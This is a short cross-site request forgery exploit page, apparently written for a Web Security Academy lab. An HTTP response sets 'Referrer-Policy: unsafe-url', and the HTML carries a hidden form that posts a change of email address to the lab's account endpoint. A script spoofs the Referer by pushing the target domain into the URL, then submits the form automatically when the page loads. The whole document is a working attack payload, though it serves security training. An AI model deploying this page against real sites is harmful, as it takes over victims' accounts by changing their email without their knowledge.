Head:

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url

Body:

<html>
  <body>
    <form action="https://0a7a006304915b0384c6916600eb0010.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="gdos1podin@web.net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/?0a7a006304915b0384c6916600eb0010.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>

